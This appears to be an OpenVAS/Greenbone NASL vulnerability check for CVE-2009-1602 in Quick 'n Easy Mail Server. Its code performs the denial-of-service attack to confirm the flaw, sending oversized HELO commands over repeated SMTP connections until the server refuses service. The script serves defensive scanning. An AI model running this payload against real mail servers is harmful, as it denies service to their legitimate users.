if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100185" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2009-05-06 14:55:27 +0200 (Wed, 06 May 2009)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_cve_id( "CVE-2009-1602" );
	script_bugtraq_id( 34814 );
	script_name( "Quick 'n Easy Mail Server SMTP Request Remote Denial Of Service Vulnerability" );
	script_category( ACT_DENIAL );
	script_family( "SMTP problems" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "smtpserver_detect.sc" );
	script_mandatory_keys( "smtp/quickneasy/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34814" );
	script_tag( name: "summary", value: "Quick 'n Easy Mail Server is prone to a denial-of-service
  vulnerability because it fails to adequately handle multiple socket requests." );
	script_tag( name: "impact", value: "Attackers can exploit this issue to cause the affected application
  to reject SMTP requests, denying service to legitimate users." );
	script_tag( name: "affected", value: "The demonstration release of Quick 'n Easy Mail Server 3.3 is
  vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("smtp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = smtp_get_port( default: 25 );
banner = smtp_get_banner( port: port );
if(!banner || !ContainsString( banner, "Quick 'n Easy Mail Server" )){
	exit( 0 );
}
soc = smtp_open( port: port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: "HELO " + smtp_get_helo_from_kb( port: port ) + "\r\n" );
helo = smtp_recv_line( socket: soc );
if(!helo || ContainsString( helo, "421 Service not available" )){
	smtp_close( socket: soc, check_data: helo );
	exit( 0 );
}
vtstrings = get_vt_strings();
data = NASLString( "HELO " );
data += crap( length: 100000, data: vtstrings["default"] + "@example.org" );
data += NASLString( "\\r\\n" );
for(i = 0;i < 35;i++){
	soc = smtp_open( port: port );
	if(!soc){
		exit( 0 );
	}
	send( socket: soc, data: data );
	ehlotxt = smtp_recv_line( socket: soc );
	smtp_close( socket: soc, check_data: ehlotxt );
	if(egrep( pattern: "421 Service not available", string: ehlotxt )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

